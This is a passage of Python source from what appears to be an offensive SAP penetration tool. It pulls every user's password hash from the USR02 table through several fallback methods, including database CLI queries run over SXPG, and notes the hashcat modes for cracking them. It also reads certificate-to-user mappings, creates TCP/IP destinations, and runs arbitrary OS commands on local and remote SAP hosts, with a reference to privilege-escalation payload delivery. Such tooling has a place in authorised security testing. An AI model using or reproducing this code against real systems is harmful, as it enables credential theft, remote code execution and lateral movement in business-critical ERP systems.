      2. RFC_READ_TABLE — returns HALF hashes (RAW fields truncated to ~8 hex
         chars due to CHAR conversion)

    Returns list of dicts with fields: MANDT, BNAME, BCODE, PASSCODE,
    PWDSALTEDHASH, CODVN, USTYP, UFLAG, hash_quality ("full" or "half").

    PWDSALTEDHASH is always full (VARCHAR, no truncation issue).
    """
    print(f"[*] {node.sid}: Downloading password hashes...")

    # --- Method 1: Direct DB query via SXPG (full hashes) ---
    rows = _download_hashes_via_sxpg(node, creds)
    if rows:
        print(f"[+] {node.sid}: Downloaded {len(rows)} FULL password hashes "
              f"via database CLI")
        return rows

    # --- Method 2: RFC_READ_TABLE (half hashes for BCODE/PASSCODE) ---
    print(f"[*] {node.sid}: Falling back to RFC_READ_TABLE (half hashes)...")
    fields = ["MANDT", "BNAME", "BCODE", "PASSCODE", "PWDSALTEDHASH",
              "CODVN", "USTYP", "UFLAG"]
    rows = read_table(node, "USR02", fields=fields, creds=creds, max_rows=9999)
    if rows:
        for r in rows:
            r["hash_quality"] = "half"
        print(f"[+] {node.sid}: Downloaded {len(rows)} password hashes "
              f"(half hashes — BCODE/PASSCODE may be truncated)")
        return rows

    # --- Method 3: RFC_READ_TABLE without RAW fields (PWDSALTEDHASH only) ---
    # Wide reads on USR02 sometimes fail because the WA buffer is too narrow
    # for the binary BCODE+PASSCODE columns, or because S_TABU_NAM auth on
    # USR02 is restricted but PWDSALTEDHASH is exposed via standard tables
    # views.  Re-try with just the CHAR/VARCHAR fields — PWDSALTEDHASH is
    # the modern iSSHA-1 / PBKDF2-SHA1 hash (hashcat mode 10300) and is
    # full-length VARCHAR, never truncated.
    print(f"[*] {node.sid}: Retrying without RAW fields "
          f"(PWDSALTEDHASH only — hashcat 10300)...")
    safe_fields = ["MANDT", "BNAME", "PWDSALTEDHASH", "CODVN", "USTYP", "UFLAG"]
    rows = read_table(node, "USR02", fields=safe_fields, creds=creds,
                      max_rows=9999)
    if rows:
        # Mark BCODE/PASSCODE as empty so downstream cracker logic knows
        # they're not available; keep hash_quality "full" because
        # PWDSALTEDHASH itself is never truncated.
        for r in rows:
            r["BCODE"] = ""
            r["PASSCODE"] = ""
            r["hash_quality"] = "issha_only"
        with_hash = sum(1 for r in rows if r.get("PWDSALTEDHASH"))
        print(f"[+] {node.sid}: Downloaded {len(rows)} user(s); "
              f"{with_hash} have PWDSALTEDHASH (mode 10300)")
        return rows

    # --- Method 4: legacy USR02 (no PWDSALTEDHASH) ---
    # PWDSALTEDHASH was added in SAP_BASIS 6.40 SP4 (~2005).  Older Oracle
    # SAP installations only have BCODE (8-byte MD5) and PASSCODE (40-byte
    # SHA-1), so requesting PWDSALTEDHASH raises FIELD_NOT_VALID.  Drop
    # the modern field and read the legacy ones directly.  RFC_READ_TABLE
    # will truncate BCODE/PASSCODE to ~8 hex chars (half hashes), still
    # crackable via hashcat modes 7701 / 7801.
    print(f"[*] {node.sid}: Retrying legacy USR02 layout "
          f"(BCODE/PASSCODE only, no PWDSALTEDHASH)...")
    legacy_fields = ["MANDT", "BNAME", "BCODE", "PASSCODE",
                     "CODVN", "USTYP", "UFLAG"]
    rows = read_table(node, "USR02", fields=legacy_fields, creds=creds,
                      max_rows=9999)
    if rows:
        for r in rows:
            r["PWDSALTEDHASH"] = ""
            r["hash_quality"] = "half"
        bcode_count = sum(1 for r in rows if r.get("BCODE"))
        pass_count = sum(1 for r in rows if r.get("PASSCODE"))
        print(f"[+] {node.sid}: Downloaded {len(rows)} user(s) — "
              f"{bcode_count} BCODE, {pass_count} PASSCODE "
              f"(half hashes — legacy basis, no PWDSALTEDHASH on this release)")
        return rows

    # --- Method 5: bare-minimum user list (no hashes) ---
    # If even the legacy field set fails, the user is likely missing
    # S_TABU_DIS / S_TABU_NAM authorisation on USR02.  Drop to the bare
    # minimum — just the MANDT/BNAME/USTYP triple is usually authorised
    # via S_USER_GRP and gives the operator at least a user inventory.
    print(f"[*] {node.sid}: Last resort: reading user list only "
          f"(MANDT/BNAME/USTYP)...")
    minimal = read_table(node, "USR02",
                          fields=["MANDT", "BNAME", "USTYP"],
                          creds=creds, max_rows=9999)
    if minimal:
        print(f"[!] {node.sid}: Recovered {len(minimal)} user name(s) "
              f"but NO HASHES — check S_TABU_NAM auth on USR02")
    else:
        print(f"[-] {node.sid}: No password hashes retrieved")
    return []


def _download_hashes_via_sxpg(node: SAPNode,
                               creds: Credentials = None) -> list | None:
    """Download FULL password hashes via direct DB query through SXPG.

    Uses execute_local_command() to run the database CLI and query USR02
    with BINTOHEX/RAWTOHEX to get un-truncated binary hash fields.

    The SXPG LOG MESSAGE field truncates at ~128 chars per line, so we
    run separate queries for each field and merge by row index.

    Returns list of dicts, or None if SXPG/DB query is not available.
    """
    db_type = (node.db_type or "").upper()
    if not db_type:
        return None

    chunk = 120  # max hex chars per SXPG output line

    # cat: SQL string-concatenation operator (|| for ANSI DBs, + for MSSQL)
    cat = "||"

    if db_type in ("HDB", "HANA"):
        tbl = "USR02"
        hex_fn_bcode = "BINTOHEX(BCODE)"
        hex_fn_passcode = "BINTOHEX(PASSCODE)"
        sub_fn = "SUBSTR"
        def run_q(sql):
            return execute_local_command(node, "hdbsql",
                                         f"-U DEFAULT -x {sql}", creds)
    elif db_type in ("ADA", "MAXDB", "ADABAS"):
        tbl = "USR02"
        hex_fn_bcode = "RAWTOHEX(BCODE)"
        hex_fn_passcode = "RAWTOHEX(PASSCODE)"
        sub_fn = "SUBSTR"
        def run_q(sql):
            return execute_local_command(node, "sqlcli",
                                         f"-U DEFAULT {sql}", creds)
    elif db_type == "MSS":
        sid = node.sid
        # Database name stays uppercase (USE TWT); schema owner is lowercase
        # (twt.USR02) because SAP MSSQL uses case-sensitive collation and the
        # dbs/mss/schema profile parameter is always lowercase.
        tbl = f"[{sid.upper()}].[{sid.lower()}].[USR02]"
        hex_fn_bcode = "CONVERT(VARCHAR(100),BCODE,2)"
        hex_fn_passcode = "CONVERT(VARCHAR(100),PASSCODE,2)"
        sub_fn = "SUBSTRING"
        # MSSQL uses named instance .\<SID>_DB; TCP/1433 is typically disabled.
        _mss_server = f".\\{sid.upper()}_DB"
        cat = "+"   # MSSQL uses + for string concatenation, not ||
        def run_q(sql):
            # Double-quote the SQL so sqlcmd -Q receives it as a single argument.
            # Without quotes, sqlcmd -Q only gets the first whitespace-delimited
            # token (e.g. "SELECT") and the rest of the query is silently discarded.
            return execute_local_command(node, "sqlcmd",
                                         f'-S {_mss_server} -h -1 -W -Q "{sql}"', creds)
    elif db_type in ("ORA", "ORACLE"):
        tbl = "SAPSR3.USR02"
        hex_fn_bcode = "RAWTOHEX(BCODE)"
        hex_fn_passcode = "RAWTOHEX(PASSCODE)"
        sub_fn = "SUBSTR"
        def run_q(sql):
            return execute_local_command(node, "sqlplus",
                                         f"-S / as sysdba @/dev/stdin <<< {sql}", creds)
    else:
        return None

    print(f"[*] {node.sid}: Querying USR02 via SXPG ({db_type} CLI) "
          f"for full hashes...")

    # Query 1: MANDT, BNAME, CODVN, USTYP, UFLAG, PWDSALTEDHASH (all CHAR fields)
    # Uses db-specific concatenation operator (|| for ANSI, + for MSSQL)
    r_meta = run_q(
        f"SELECT MANDT{cat}'~~~'{cat}BNAME{cat}'~~~'{cat}CODVN{cat}'~~~'{cat}USTYP"
        f"{cat}'~~~'{cat}UFLAG{cat}'~~~'{cat}PWDSALTEDHASH FROM {tbl}")

    if not r_meta.get("success"):
        print(f"[-] {node.sid}: SXPG USR02 meta query failed: "
              f"{r_meta.get('error', '')}")
        return None

    # Query 2: BCODE hex (may need 2 chunks for 80 hex chars)
    r_bcode = run_q(f"SELECT {hex_fn_bcode} FROM {tbl}")

    # Query 3: PASSCODE hex
    r_passcode = run_q(f"SELECT {hex_fn_passcode} FROM {tbl}")

    # Parse output lines
    def _clean(result):
        lines = []
        for line in result.get("output", []):
            clean = line.strip().strip('"').strip("'")
            if clean.startswith("|") and clean.endswith("|"):
                clean = clean[1:-1].strip()
            elif clean.startswith("|"):
                clean = clean[1:].strip()
            if not clean or clean.startswith("---") or clean.startswith("==="):
                continue
            up = clean.upper()
            if up.startswith(("MANDT", "BINTOHEX", "RAWTOHEX", "CONVERT",
                              "SUBSTR", "EXPRESSION", "BCODE", "PASSCODE")):
                continue
            if clean.startswith("*") or "rows selected" in clean.lower():
                continue
            lines.append(clean)
        return lines

    meta_lines = _clean(r_meta)
    bcode_lines = _clean(r_bcode) if r_bcode.get("success") else []
    passcode_lines = _clean(r_passcode) if r_passcode.get("success") else []

    if not meta_lines:
        print(f"[-] {node.sid}: SXPG USR02 query returned no data")
        return None

    rows = []
    for i, meta in enumerate(meta_lines):
        parts = meta.split("~~~")
        if len(parts) < 5:
            continue
        row = {
            "MANDT": parts[0].strip(),
            "BNAME": parts[1].strip(),
            "CODVN": parts[2].strip(),
            "USTYP": parts[3].strip(),
            "UFLAG": parts[4].strip(),
            "PWDSALTEDHASH": parts[5].strip() if len(parts) > 5 else "",
            "BCODE": bcode_lines[i].strip().upper() if i < len(bcode_lines) else "",
            "PASSCODE": passcode_lines[i].strip().upper() if i < len(passcode_lines) else "",
            "hash_quality": "full",
        }
        rows.append(row)

    return rows if rows else None


# ---------------------------------------------------------------------------
# External-ID mapping (USREXTID) — the on-prem side of principal propagation
# ---------------------------------------------------------------------------

def download_usrextid(node: SAPNode, creds: Credentials = None,
                       max_rows: int = 9999) -> list:
    """Read USREXTID — the table that maps incoming X.509 cert subjects
    (or SNC names) to ABAP usernames.

    USREXTID is the on-prem side of every principal-propagation flow:
    when SCC mints a forwarded cert with subject ``CN=<x>``, the ABAP
    kernel resolves that CN through USREXTID to find the actual ABAP
    user the request runs as.

    Columns:

      * ``MANDT``   — client (000 means cross-client)
      * ``BNAME``   — ABAP user the EXTID resolves to
      * ``EXTID``   — the cert subject / SNC name (typically ``CN=...``)
      * ``TYPE``    — ``DN`` (full distinguished name match) or ``CN``
                      (cn-only match, governed by the kernel parameter
                      ``login/certificate_mapping_rulebased``)
      * ``SEQNO``   — sequence number for multi-DN-per-user

    EXTID is ``CHAR(1024)`` on standard kernels.  Combined with the
    other fields, each row easily overflows RFC_READ_TABLE's default
    512-byte WA buffer (DATA_BUFFER_EXCEEDED → silent 0 rows on most
    callers).  We set ``long_strings=True`` so the kernel returns rows
    via the unbounded ET_DATA STRING field on modern S/4 kernels.

    On the rare older kernel that doesn't honour ``USE_ET_DATA_4_RETURN``
    we fall back to a 2-column probe (MANDT/BNAME) — enough to confirm
    the table has entries even if we can't read the EXTID payload —
    and tag those rows with ``EXTID = "(truncated — old kernel)"``.

    Returns the list of row dicts (empty list on genuine empty table
    or failure).
    """
    rows = read_table(
        node, "USREXTID",
        fields=["MANDT", "BNAME", "EXTID", "TYPE", "SEQNO"],
        creds=creds, max_rows=max_rows,
        long_strings=True)

    # Sanity: even when long_strings returned rows, the parser may have
    # produced empty dicts on a kernel that returns ET_DATA in some
    # unrecognised shape.  Detect that and treat as "no rows" so the
    # fallback fires.
    has_usable_bname = any((r.get("BNAME") or "").strip()
                            for r in (rows or []))
    if rows and has_usable_bname:
        return rows
    if rows and not has_usable_bname:
        print(f"[!] {node.sid}: USREXTID long_strings returned "
              f"{len(rows)} row(s) but BNAME is empty in all of them — "
              f"parser couldn't match the ET_DATA shape.  Falling back "
              f"to a narrower DATA-mode read (EXTID will be truncated).")

    # Fallback: probe without EXTID so we at least know whether the
    # table is empty or just too wide for this kernel's buffer.  The
    # 3-column WA fits in the 512-byte buffer no matter what, so we
    # always get usable BNAME / TYPE.
    fallback = read_table(
        node, "USREXTID",
        fields=["MANDT", "BNAME", "TYPE"],
        creds=creds, max_rows=max_rows,
        quiet=True)
    if not fallback:
        return []
    # Now try to fetch EXTID values per BNAME so the operator still
    # sees something useful, even if truncated.  Same kernel, but with
    # a tight WHERE — each row's WA only carries (MANDT|EXTID|SEQNO)
    # which is well under the buffer cap when EXTID is bounded.
    extids = read_table(
        node, "USREXTID",
        fields=["MANDT", "BNAME", "EXTID", "SEQNO"],
        creds=creds, max_rows=max_rows,
        quiet=True)
    extid_map = {}
    for r in (extids or []):
        key = (r.get("MANDT", ""), r.get("BNAME", ""), r.get("SEQNO", ""))
        ev = (r.get("EXTID") or "").strip()
        if ev:
            extid_map[key] = ev
    print(f"[!] {node.sid}: USREXTID fallback read — "
          f"{len(fallback)} BNAME/TYPE row(s), "
          f"{len(extid_map)} EXTID payload(s) recovered.")
    for r in fallback:
        key = (r.get("MANDT", ""), r.get("BNAME", ""),
               r.get("SEQNO", ""))
        r["EXTID"] = extid_map.get(key, "(EXTID unreadable — "
                                          "wide field, kernel quirk)")
        r["SEQNO"] = r.get("SEQNO", "")
    return fallback


# ---------------------------------------------------------------------------
# Client role detection
# ---------------------------------------------------------------------------

def get_client_roles(node: SAPNode, creds: Credentials = None) -> list:
    """Read T000 table to get client categories (P=Production, etc.).

    Returns list of dicts: {MANDT, CCCATEGORY, CCCORACTIV, MTEXT}
    """
    # Try CNV_MBT_SHELL_GET_CLIENTS first (S/4 systems)
    clients = []
    try:
        with _get_connection(node, creds) as conn:
            try:
                result = conn.call(CNV_MBT_SHELL_GET_CLIENTS)
                client_list = result.get("ET_CLIENTS", [])
                for c in client_list:
                    clients.append({
                        "MANDT": c.get("MANDT", "") or c.get("CLIENT", ""),
                        "CCCATEGORY": c.get("CCCATEGORY", ""),
                    })
                if clients:
                    return clients
            except Exception:
                pass  # Fall through to RFC_READ_TABLE

            # Fallback: RFC_READ_TABLE on T000
            result = conn.call(
                RFC_READ_TABLE,
                QUERY_TABLE="T000",
                DELIMITER="|",
                FIELDS=[
                    {"FIELDNAME": "MANDT"},
                    {"FIELDNAME": "CCCATEGORY"},
                    {"FIELDNAME": "CCCORACTIV"},
                    {"FIELDNAME": "MTEXT"},
                ],
            )
            data = result.get("DATA", [])
            for row in data:
                parts = row.get("WA", "").split("|")
                if len(parts) >= 2:
                    clients.append({
                        "MANDT": parts[0].strip(),
                        "CCCATEGORY": parts[1].strip(),
                        "CCCORACTIV": parts[2].strip() if len(parts) > 2 else "",
                        "MTEXT": parts[3].strip() if len(parts) > 3 else "",
                    })

    except Exception as e:
        logger.debug(f"Client role read failed for {node.sid}: {format_rfc_exception(e)}")
        print(f"[-] {node.sid}: Could not read client roles: {format_rfc_exception(e)}")

    return clients


def update_node_production_status(node: SAPNode, creds: Credentials = None):
    """Check client roles and update node's production status + clients list."""
    client_roles = get_client_roles(node, creds)
    if client_roles:
        node.clients = [
            {"nr": c["MANDT"], "category": c.get("CCCATEGORY", "")}
            for c in client_roles
        ]
        node.is_production = any(
            c.get("CCCATEGORY", "").upper() == "P" for c in client_roles
        )
        if node.is_production:
            print(f"[!] {node.sid} has PRODUCTION client(s)")
        else:
            print(f"[*] {node.sid} has no production clients")


# ---------------------------------------------------------------------------
# TCP/IP destination creation (sapxpg remote test)
# ---------------------------------------------------------------------------

def create_tcpip_destination(node: SAPNode, target_host: str,
                             target_sid: str = "",
                             target_gw_port: str = "",
                             creds: Credentials = None) -> dict:
    """Create a TCP/IP destination for remote sapxpg execution.

    Args:
        node: source SAP system to create the destination on
        target_host: IP/hostname of the target system
        target_sid: SID of the target (used in dest name)
        target_gw_port: gateway port of the target (e.g. "3300")
        creds: credentials to use on the source system

    Returns dict with: success, message, dest_name
    """
    ts = datetime.now().strftime("%Y%m%d%H%M%S")
    dest_name = f"SAPMAP_{target_sid}_{ts}" if target_sid else f"SAPMAP_{target_host[:14]}_{ts}"
    gw_service = target_gw_port or "3300"

    result = {"success": False, "message": "", "dest_name": dest_name}

    try:
        with _get_connection(node, creds) as conn:
            create_result = conn.call(
                DEST_RFC_TCPIP_CREATE,
                NAME=dest_name,
                DESCRIPTION=f"TCP/IP CONNECTION TO {target_sid or target_host}",
                SERVER_NAME=target_host,
                GATEWAY_HOST=target_host,
                GATEWAY_SERVICE=gw_service,
                METHOD="E",
                PROGRAM="sapxpg",
                CPIC_TIMEOUT="20",
            )
            # Check result
            ret = create_result.get("RETURN", {})
            if isinstance(ret, dict) and ret.get("TYPE", "") in ("E", "A"):
                result["message"] = ret.get("MESSAGE", "Unknown error")
            else:
                result["success"] = True
                result["message"] = f"TCP/IP destination {dest_name} created"
                print(f"[+] {node.sid}: Created TCP/IP dest {dest_name} → "
                      f"{target_host} (gw={gw_service})")
    except Exception as e:
        result["message"] = format_rfc_exception(e)
        print(f"[-] {node.sid}: TCP/IP dest creation error: {format_rfc_exception(e)}")
        logger.debug(f"TCP/IP dest creation failed: {format_rfc_exception(e)}")

    return result


# ---------------------------------------------------------------------------
# Remote OS command execution via SXPG_STEP_XPG_START
# ---------------------------------------------------------------------------

def execute_remote_command(node: SAPNode, destination: str,
                           command: str, params: str,
                           creds: Credentials = None,
                           long_params=None) -> dict:
    """Execute an OS command on a remote system via SXPG_STEP_XPG_START.

    Uses an existing TCP/IP destination (sapxpg) to run a command on the
    target system.  The source system calls SXPG_STEP_XPG_START which
    forwards the execution request over the TCP/IP destination.

    Args:
        node: source SAP system (where we have credentials)
        destination: TCP/IP destination name (e.g. SAPMAP_W74_20260305165740)
        command: executable to run (e.g. cmd.exe or /bin/sh)
        params: command parameters (e.g. /C whoami or -c whoami)
        creds: credentials on the source system
        long_params: if specified (not None), sent to LONG_PARAMS verbatim
            and PARAMS is sent as-is — this is the mode our LPE delivery
            uses ("python3" + "-c" + 800-char hex chunk).  If None (the
            default), legacy auto-route kicks in: PARAMS gets params if
            short, LONG_PARAMS gets params if long.

    Returns dict with: success, output (list of lines), error
    """
    result = {"success": False, "output": [], "error": ""}

    if long_params is not None:
        # Explicit two-field mode: caller knows what goes in each slot.
        sxpg_params = params
        sxpg_long_params = long_params
    else:
        # Legacy single-source auto-route: pick the slot that fits.
        sxpg_params = params if len(params) <= 255 else ""
        sxpg_long_params = params if len(params) > 255 else ""

    # Base kwargs shared by both call attempts
    _sxpg_kwargs = dict(
        TARGET="",
        DESTINATION=destination,
        EXTPROG=command,
        PARAMS=sxpg_params,
        STDINCNTL="R",
        STDOUTCNTL="M",
        STDERRCNTL="M",
        TRACECNTL="0",
        TERMCNTL="C",
        TRACELEVEL="0",
        LONG_PARAMS=sxpg_long_params,
        CONNCNTL="H",
    )

    try:
        with _get_connection(node, creds) as conn:
            try:
                # MXROW raises RFC_INVALID_PARAMETER on older SAP kernels
                # (e.g. Basis 7.0x / Windows 2008 R2); default is 2 rows so
                # we ask for 9999 but fall back gracefully if unsupported.
                call_result = conn.call(
                    "SXPG_STEP_XPG_START", MXROW=9999, **_sxpg_kwargs
                )
            except Exception as mxrow_err:
                if "MXROW" in str(mxrow_err) or "RFC_INVALID_PARAMETER" in str(mxrow_err):
                    logger.debug(
                        f"SXPG MXROW not supported on this kernel, retrying without it: {mxrow_err}"
                    )
                    call_result = conn.call("SXPG_STEP_XPG_START", **_sxpg_kwargs)
                else:
                    raise

            # Parse LOG table for output lines
            log_table = call_result.get("LOG", [])
            for row in log_table:
                line = ""
                if isinstance(row, dict):
                    line = (row.get("MESSAGE", "") or
                            row.get("LINE", "") or
                            row.get("TEXT", "")).strip()
                elif isinstance(row, str):
                    line = row.strip()
                if line:
                    result["output"].append(line)

            # Check return status
            ret_status = call_result.get("STATUS", "")
            if str(ret_status).strip() in ("O", "0", ""):
                result["success"] = True
            elif result["output"]:
                # Some systems return output even on non-zero status
                result["success"] = True
            else:
                result["error"] = f"SXPG status: {ret_status}"

    except Exception as e:
        result["error"] = format_rfc_exception(e)
        logger.debug(f"SXPG remote command failed via {destination}: {format_rfc_exception(e)}")

    return result


def execute_local_command(node: SAPNode, command: str, params: str,
                          creds: Credentials = None,
                          long_params=None) -> dict:
    """Execute an OS command on the node itself via SXPG_STEP_XPG_START.

    Creates a self-referencing TCP/IP destination (pointing to localhost)
    if one doesn't already exist, then calls execute_remote_command().

    Args:
        node: target SAP system (must have credentials with SAP_ALL)
        command: executable to run (e.g. cmd.exe or /bin/sh)
        params: command parameters
        creds: credentials on the system
        long_params: optional separate LONG_PARAMS slot (forwarded to
            execute_remote_command).  When set, PARAMS keeps ``params``
            and LONG_PARAMS gets ``long_params`` — required for the LPE
            upload pipeline where PARAMS="-c" and the script lives in
            LONG_PARAMS.  When None (default), legacy single-source
            auto-route applies.

    Returns dict with: success, output (list of lines), error
    """
    result = {"success": False, "output": [], "error": ""}

    # Per-node cache: once we discover a usable self-referencing
    # TCP/IP destination, reuse it directly on subsequent calls so
    # bulk operations (LPE binary chunk upload, etc.) don't repeat
    # the RFCDES scan + log line on every chunk.
    cached_dest = getattr(node, "_sxpg_dest_cache", None)
    if cached_dest:
        dest_name = cached_dest
        try:
            return execute_remote_command(
                node, dest_name, command, params, creds,
                long_params=long_params)
        except Exception:
            # Cache could be stale (operator deleted dest, etc.);
            # fall through to full discovery.
            try:
                delattr(node, "_sxpg_dest_cache")
            except Exception:
                pass

    # Look for an existing self-referencing TCP/IP destination.  This
    # is critical when the connecting user lacks S_RFC_ADM (FL046 on
    # DEST_RFC_TCPIP_CREATE): if any sapxpg dest pointing at this host
    # already exists, we can reuse it instead of failing.
    dest_name = None
    try:
        with _get_connection(node, creds) as conn:
            try:
                table_result = conn.call(
                    "RFC_READ_TABLE",
                    QUERY_TABLE="RFCDES",
                    DELIMITER="|",
                    FIELDS=[{"FIELDNAME": "RFCDEST"}, {"FIELDNAME": "RFCTYPE"},
                            {"FIELDNAME": "RFCOPTIONS"}],
                    OPTIONS=[{"TEXT": "RFCTYPE = 'T'"}],
                    ROWCOUNT=500,
                )
                # Collect candidate host strings the dest might point at:
                # short hostname, FQDN, IP, "localhost", "127.0.0.1".  We
                # do a substring match (case-insensitive) on RFCOPTIONS.
                host_aliases = set()
                for h in (node.ip, node.hostname,
                          getattr(node, "fqdn", "") or ""):
                    if h:
                        h = h.strip().upper()
                        host_aliases.add(h)
                        # Add the short hostname (before the first dot)
                        if "." in h:
                            host_aliases.add(h.split(".", 1)[0])
                host_aliases.update({"LOCALHOST", "127.0.0.1"})

                # Prefix SAPMAP itself uses for dests targeting THIS node.
                own_prefix = f"SAPMAP_{node.sid.upper()}_"

                own_match = None       # SAPMAP-created for this exact SID
                alias_match = None     # operator-created, host alias hits
                for row in table_result.get("DATA", []):
                    line = row.get("WA", "") if isinstance(row, dict) else str(row)
                    parts = line.split("|")
                    if len(parts) < 3:
                        continue
                    name = parts[0].strip()
                    opts = parts[2].strip().upper()
                    # Must run sapxpg via gateway (program=sapxpg)
                    if "SAPXPG" not in opts:
                        continue
                    name_up = name.upper()
                    if name_up.startswith(own_prefix):
                        own_match = name
                        break  # best possible match — stop scanning
                    if name_up.startswith("SAPMAP_"):
                        # SAPMAP-named for a DIFFERENT SID — never reuse;
                        # would silently send commands to the wrong host.
                        continue
                    if alias_match is None and any(
                            h and h in opts for h in host_aliases):
                        alias_match = name

                if own_match:
                    dest_name = own_match
                    print(f"[*] {node.sid}: Reusing SAPMAP-created "
                          f"TCP/IP dest {dest_name!r} for SXPG")
                elif alias_match:
                    dest_name = alias_match
                    print(f"[*] {node.sid}: Reusing existing "
                          f"TCP/IP dest {dest_name!r} for SXPG")
            except Exception:
                pass  # RFC_READ_TABLE might not be available
    except Exception:
        pass

    # Create one if not found
    if not dest_name:
        host = node.ip or node.hostname
        if not host:
            result["error"] = "No IP/hostname for node"
            return result

        # Find own gateway port
        gw_port = None
        for inst in node.instances:
            for port, svc in inst.ports.items():
                if svc == "gateway" or (3300 <= port <= 3399):
                    gw_port = str(port)
                    break
            if gw_port:
                break
        if not gw_port:
            gw_port = "3300"

        create_result = create_tcpip_destination(
            node, target_host=host, target_sid=node.sid,
            target_gw_port=gw_port, creds=creds,
        )
        if not create_result["success"]:
            result["error"] = f"Could not create TCP/IP dest: {create_result['message']}"
            return result
        dest_name = create_result["dest_name"]

    # Remember the dest for subsequent calls on this node.  Setting
    # an attribute on a dataclass instance is allowed (it doesn't
    # affect to_dict() because to_dict explicitly lists fields).
    try:
        node._sxpg_dest_cache = dest_name
    except Exception:
        pass

    # Execute command via the destination
    return execute_remote_command(node, dest_name, command, params, creds,
                                  long_params=long_params)
